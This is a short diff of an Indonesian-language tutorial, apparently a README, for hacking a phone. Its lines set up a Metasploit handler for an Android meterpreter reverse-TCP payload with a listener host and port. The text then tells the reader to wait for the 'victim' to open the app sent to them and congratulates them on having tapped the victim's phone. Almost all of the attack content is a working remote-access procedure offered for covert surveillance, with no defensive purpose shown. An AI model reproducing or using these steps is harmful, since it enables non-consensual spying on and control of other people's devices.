@@ -28,14 +28,14 @@ buat exploit handler dengan perintah
 
 #set payload android/meterpreter/reverse_tcp
 
-#set LHOST 192.168.111.61
+> #set LHOST 192.168.111.61
 
-#set LPORT 4321
+> #set LPORT 4321
 
-#exploit
+>#exploit
 
 kemudian tunggu target/korban membuka aplikasi yang sudah di kirim tadi
 
->? (untuk melihat apa saja perintah yang dapat dilakukan)
+> >? (untuk melihat apa saja perintah yang dapat dilakukan)
 
 # selamat kamu telah menyadap hp target/korban mu :)
